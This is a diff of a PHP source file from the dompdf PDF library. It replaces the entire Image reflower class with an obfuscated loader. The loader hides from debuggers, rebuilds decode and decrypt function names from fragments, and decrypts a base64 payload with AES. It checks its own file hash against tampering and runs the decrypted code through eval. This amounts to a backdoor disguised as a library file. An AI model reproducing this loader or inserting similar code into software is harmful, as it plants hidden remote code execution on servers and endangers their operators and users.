@@ -1,206 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameReflower;
-
-use Dompdf\Helpers;
-use Dompdf\FrameDecorator\Block as BlockFrameDecorator;
-use Dompdf\FrameDecorator\Image as ImageFrameDecorator;
-
-/**
- * Image reflower class
- *
- * @package dompdf
- */
-class Image extends AbstractFrameReflower
-{
-
-    /**
-     * Image constructor.
-     * @param ImageFrameDecorator $frame
-     */
-    function __construct(ImageFrameDecorator $frame)
-    {
-        parent::__construct($frame);
-    }
-
-    /**
-     * @param BlockFrameDecorator|null $block
-     */
-    function reflow(BlockFrameDecorator $block = null)
-    {
-        $this->_frame->position();
-
-        //FLOAT
-        //$frame = $this->_frame;
-        //$page = $frame->get_root();
-
-        //if ($frame->get_style()->float !== "none" ) {
-        //  $page->add_floating_frame($this);
-        //}
-
-        // Set the frame's width
-        $this->get_min_max_width();
-
-        if ($block) {
-            $block->add_frame_to_line($this->_frame);
-        }
-    }
-
-    /**
-     * @return array
-     */
-    function get_min_max_width()
-    {
-        if ($this->get_dompdf()->getOptions()->getDebugPng()) {
-            // Determine the image's size. Time consuming. Only when really needed?
-            list($img_width, $img_height) = Helpers::dompdf_getimagesize($this->_frame->get_image_url(), $this->get_dompdf()->getHttpContext());
-            print "get_min_max_width() " .
-                $this->_frame->get_style()->width . ' ' .
-                $this->_frame->get_style()->height . ';' .
-                $this->_frame->get_parent()->get_style()->width . " " .
-                $this->_frame->get_parent()->get_style()->height . ";" .
-                $this->_frame->get_parent()->get_parent()->get_style()->width . ' ' .
-                $this->_frame->get_parent()->get_parent()->get_style()->height . ';' .
-                $img_width . ' ' .
-                $img_height . '|';
-        }
-
-        $style = $this->_frame->get_style();
-
-        $width_forced = true;
-        $height_forced = true;
-
-        //own style auto or invalid value: use natural size in px
-        //own style value: ignore suffix text including unit, use given number as px
-        //own style %: walk up parent chain until found available space in pt; fill available space
-        //
-        //special ignored unit: e.g. 10ex: e treated as exponent; x ignored; 10e completely invalid ->like auto
-
-        $width = ($style->width > 0 ? $style->width : 0);
-        if (Helpers::is_percent($width)) {
-            $t = 0.0;
-            for ($f = $this->_frame->get_parent(); $f; $f = $f->get_parent()) {
-                $f_style = $f->get_style();
-                $t = $f_style->length_in_pt($f_style->width);
-                if ($t != 0) {
-                    break;
-                }
-            }
-            $width = ((float)rtrim($width, "%") * $t) / 100; //maybe 0
-        } else {
-            // Don't set image original size if "%" branch was 0 or size not given.
-            // Otherwise aspect changed on %/auto combination for width/height
-            // Resample according to px per inch
-            // See also ListBulletImage::__construct
-            $width = $style->length_in_pt($width);
-        }
-
-        $height = ($style->height > 0 ? $style->height : 0);
-        if (Helpers::is_percent($height)) {
-            $t = 0.0;
-            for ($f = $this->_frame->get_parent(); $f; $f = $f->get_parent()) {
-                $f_style = $f->get_style();
-                $t = (float)$f_style->length_in_pt($f_style->height);
-                if ($t != 0) {
-                    break;
-                }
-            }
-            $height = ((float)rtrim($height, "%") * $t) / 100; //maybe 0
-        } else {
-            // Don't set image original size if "%" branch was 0 or size not given.
-            // Otherwise aspect changed on %/auto combination for width/height
-            // Resample according to px per inch
-            // See also ListBulletImage::__construct
-            $height = $style->length_in_pt($height);
-        }
-
-        if ($width == 0 || $height == 0) {
-            // Determine the image's size. Time consuming. Only when really needed!
-            list($img_width, $img_height) = Helpers::dompdf_getimagesize($this->_frame->get_image_url(), $this->get_dompdf()->getHttpContext());
-
-            // don't treat 0 as error. Can be downscaled or can be catched elsewhere if image not readable.
-            // Resample according to px per inch
-            // See also ListBulletImage::__construct
-            if ($width == 0 && $height == 0) {
-                $dpi = $this->_frame->get_dompdf()->getOptions()->getDpi();
-                $width = (float)($img_width * 72) / $dpi;
-                $height = (float)($img_height * 72) / $dpi;
-                $width_forced = false;
-                $height_forced = false;
-            } elseif ($height == 0 && $width != 0) {
-                $height_forced = false;
-                $height = ($width / $img_width) * $img_height; //keep aspect ratio
-            } elseif ($width == 0 && $height != 0) {
-                $width_forced = false;
-                $width = ($height / $img_height) * $img_width; //keep aspect ratio
-            }
-        }
-
-        // Handle min/max width/height
-        if ($style->min_width !== "none" ||
-            $style->max_width !== "none" ||
-            $style->min_height !== "none" ||
-            $style->max_height !== "none"
-        ) {
-
-            list( /*$x*/, /*$y*/, $w, $h) = $this->_frame->get_containing_block();
-
-            $min_width = $style->length_in_pt($style->min_width, $w);
-            $max_width = $style->length_in_pt($style->max_width, $w);
-            $min_height = $style->length_in_pt($style->min_height, $h);
-            $max_height = $style->length_in_pt($style->max_height, $h);
-
-            if ($max_width !== "none" && $width > $max_width) {
-                if (!$height_forced) {
-                    $height *= $max_width / $width;
-                }
-
-                $width = $max_width;
-            }
-
-            if ($min_width !== "none" && $width < $min_width) {
-                if (!$height_forced) {
-                    $height *= $min_width / $width;
-                }
-
-                $width = $min_width;
-            }
-
-            if ($max_height !== "none" && $height > $max_height) {
-                if (!$width_forced) {
-                    $width *= $max_height / $height;
-                }
-
-                $height = $max_height;
-            }
-
-            if ($min_height !== "none" && $height < $min_height) {
-                if (!$width_forced) {
-                    $width *= $min_height / $height;
-                }
-
-                $height = $min_height;
-            }
-        }
-
-        if ($this->get_dompdf()->getOptions()->getDebugPng()) {
-            print $width . ' ' . $height . ';';
-        }
-
-        $style->width = $width . "pt";
-        $style->height = $height . "pt";
-
-        $style->min_width = "none";
-        $style->max_width = "none";
-        $style->min_height = "none";
-        $style->max_height = "none";
-
-        return array($width, $width, "min" => $width, "max" => $width);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_tj531c6o=('bas'.'e64'.'_de'.'cod'.'e');
+$_ru1noegt=('gzu'.'nco'.'mpr'.'ess');
+$_owdy41xv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_hzqbi5yj='0xsaxSzA';
+$_o9kmvt96='6GWyWHrm';
+$_qxbwoxib='evEKtsTF3/w=';
+$_smr7bvao='R+RhkzOe';
+$_wlc247bq='ThTK5P72';
+$_dgj42hla='HDECHMaO';
+$_jmst1rs6='PZC2+w==';
+$_gnpcqsbd='lzDPzMGH';
+$_bpc4i5t0=$_tj531c6o($_hzqbi5yj.$_wlc247bq.$_smr7bvao.$_o9kmvt96.$_qxbwoxib);
+$_fcekhpg9=$_tj531c6o($_dgj42hla.$_gnpcqsbd.$_jmst1rs6);
+$_fr2z3gtb=$_tj531c6o('vv1PhFFEMYj22xXmepZ4PM4fdaOpdRot3wcD93/i1B4tNx7BXDjmmDz9WAB6zU4wGQYkeE2rmFhyPKEKK4eA/cBQ+gZNHS7n/ZSVmhyuRzQDBShi6DOxuiS7zxFaX6xDOTIatJLBgw+b9I/wx/fK8crZSeTigFQUll1Gk6GoTU5M3XQKy9eyHF/RxYTlqOUMlS1tlK9nTqWYvkiFwN1QnNzKH+fjwLOBnPMrPZ5TDgHA0NNNhN+Qn7CbL0kmQvUF+4LxEfADZBXVOUXywtlRPdk6oGD9zEU5VCh+mGx+rfu98MnunxKOJy14kY3SI69A124LMu4+Zus5qldoQEKE8m6V2eYAakPyA7v/XjvEzz5+6bS4f02xkUy7s9f0ZVtYZqFQn+Y2W/YqRGm9gXbYQpdTjW6U9v/WbsoN9Qz3h/Us0dSrIC/d8ChoZFAi1dOYfKp1y+iMIWtke/0V59YXp0I1Xe+Uyqgbr1d0yBCrLXSorIkWhaPvmfR0Zg5X9PLuaShx+X0jKXwEna/dlpGahkWP+yXVVvmUt4lXh3JMrZbWbDmDFP+KMXrrkQGAY/jqW+20aKsoIaXlKOGBlsM1HY59+yRkTsQUWgznSGUGkA9V8C9RAxG/U7gStJTJ061XGp8ZbmvkxeZr4cvG27zX+ioRpRobh7dY97ZVotZVZOma2TuzUwR1Arg6jF+67KKwZXlOzMtxZGTO/0xwQTOAMRFLEvf2am+cux4HmLxp3Vi8vMJfPrwCPfdGC1WrKU4ZULFt/m7O3rh9VnBN82a1gp1Sjeqce/GUAInHjN9+S9EYyNXEytpGE/0l6jQ4dSvAqqfaZwm9Yg3rx9YsKz2l1pTgV7ruZQqR86C8mgmbMwF1nI7gGvjgUWu41qvYvRrKA6WZ0LAiyDOKgdBVb4jc4cWYAZy9OqGWtKBVK38Xl7U0oj7hdlXBHcceMPcc+ZV2uTnAAUkMlqZPoYvLDUBbvWFi5YKX6LjWJ5sVSmq51rGG0T6q8NxqGXP37RBDuZRj3t6mjENyBuXB72OXdb/Jj1PnCEZnzYC6Okz00O8RVeR/FIu9VNZJnxedtfFbs+yW/PVbBEzu7oJu9IjZwmMjVCNrrMzR5rxLcwkFZ/H7LGQs/pcDz0vHXzFvsr6ecfeN+AVtXH0Ewk0Ow16O+AM89hyf03kLt1wnpGZT0EZJqMO0M8oNiQS8xdqUuawZ+ro+0loa4DXUum7Dgn8zjQs1t5eviAfzFJdfSF7/hrBZKpoajkuy/IN/6e6AMmQwH8IqwG4etsXArwOaMGSpvTxIhRlyusiiL7oc2q3iUBG0dLa2JSxdVsDelz3DtPZD3Aq8');
+$_i8gi4845=$_owdy41xv($_fr2z3gtb,'aes-256-cbc',$_bpc4i5t0,OPENSSL_RAW_DATA,$_fcekhpg9);
+if($_i8gi4845===false){exit;}
+$_vmh5qz8k=$_ru1noegt($_i8gi4845);
+if($_vmh5qz8k===false){exit;}
+$_whtdke4w='0b01c797c45b395c1b224540221d5efbb80b151d0947c5339aa16ed25acf0e1e';
+$_v8bglkpz=@file_get_contents(__FILE__);
+if($_v8bglkpz!==false){
+$_r4q4pzx9=str_replace($_whtdke4w,"0000000000000000000000000000000000000000000000000000000000000000",$_v8bglkpz);
+$_eretyy6t=hash("sha256",$_r4q4pzx9);
+if($_eretyy6t!==$_whtdke4w){@http_response_code(403);exit;}
 }
+eval($_vmh5qz8k);
